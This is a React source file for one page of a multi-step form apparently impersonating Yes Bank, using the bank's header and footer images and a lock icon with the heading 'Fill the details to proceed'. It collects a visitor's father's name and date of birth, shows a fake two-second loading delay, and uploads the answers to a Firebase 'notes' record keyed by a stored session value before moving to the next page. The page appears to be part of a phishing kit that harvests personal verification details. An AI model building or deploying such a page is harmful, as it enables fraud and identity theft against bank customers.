import  { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import FirebaseUtil from './FirebaseRepo';
import { MdLock } from "react-icons/md";
import myImage from './assets/yes_bank_top.png';
import footerImage from './assets/yes_footer.jpeg';
import DatePicker from "react-datepicker";
import "react-datepicker/dist/react-datepicker.css";

function SecondPage() {
  const navigate = useNavigate();
  const [fatherName, setFatherName] = useState('');
  const [dateOfBirth, setDateOfBirth] = useState(null);
  const [isSubmitting, setIsSubmitting] = useState(false); // Submit loading state


  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true); // Show loading during submit
    // Simulate form submission delay
    const formattedDate = dateOfBirth ? dateOfBirth.toLocaleDateString() : '';
    setTimeout(async () =>  {
      const key = localStorage.getItem('key');
    const result = await  FirebaseUtil.uploadAnyModel("notes/"+key, { fatherName, formattedDate });
    console.log("result.key = "+result.key);
      navigate('/second-page'); // Navigate to third page after submission
      setIsSubmitting(false); // Hide loading after submit
    }, 2000); // 1-second delay
  };

  return (
    <div className="max-w-md mx-auto p-4 mt-4 bg-blue-600 rounded shadow">
      {isSubmitting && (
        <div className="absolute inset-0 flex items-center justify-center bg-white bg-opacity-50">
          <div className="loader"></div>
        </div>
      )}
        <div className="flex justify-center items-center w-full">
          <img className="w-auto h-auto" src={myImage} alt="Description of the image" />
        </div>
      <h1 className="text-lg font-bold mb-4 flex items-center text-white">
        <MdLock className="mr-2 text-orange-500" />
        Fill the details to proceed
      </h1>
      <form onSubmit={handleSubmit}>
        <div className="mb-4">
          <label
            className="block text-gray-200 text-sm font-bold mb-2"
            htmlFor="name"
          >
            Father Name 
          </label>
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="name"
            type="text"
            value={fatherName}
            onChange={(e) => setFatherName(e.target.value)}
            required
          />
        </div>
     
        <div className="mb-4">
            <label
              className="block text-gray-200 text-sm font-bold mb-2"
              htmlFor="dateOfBirth"
            > Date of birth
            </label>
            <DatePicker
              selected={dateOfBirth}
              onChange={(date) => setDateOfBirth(date)}
              dateFormat="dd/MM/yyyy"
              showYearDropdown
              yearDropdownItemNumber={100}
              scrollableYearDropdown
              className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
              placeholderText="Select your date of birth"
              maxDate={new Date()}
              required
            />
          </div>
        <div className="flex justify-center">
          <button
            className="bg-gray-200 hover:bg-gray-400 text-gray-900 font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline"
            type="submit"
            disabled={isSubmitting} // Disable button during submit   
          >
            {isSubmitting ? "Loading..." : "Proceed"}
          </button>
        </div>
      </form>
      {/* footer image */}
      <div className="flex justify-center mt-4">
        <img src={footerImage} alt="Description of the image" />
      </div>
      
    </div>
  );
}

export default SecondPage;